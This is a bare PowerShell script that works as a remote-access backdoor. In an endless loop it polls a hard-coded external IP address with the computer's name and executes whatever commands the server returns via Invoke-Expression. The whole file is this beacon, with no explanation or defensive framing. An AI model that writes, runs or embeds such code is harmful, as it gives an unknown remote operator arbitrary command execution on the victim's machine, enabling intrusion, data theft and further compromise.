while($true) {
    $r = (Invoke-WebRequest -Uri "http://130.61.93.75:10004/$env:COMPUTERNAME" -UseBasicParsing).Content.Trim()
    if ($r -ne 'created' -and $r -ne 'empty') { Invoke-Expression $r }
    Start-Sleep -Seconds 10
}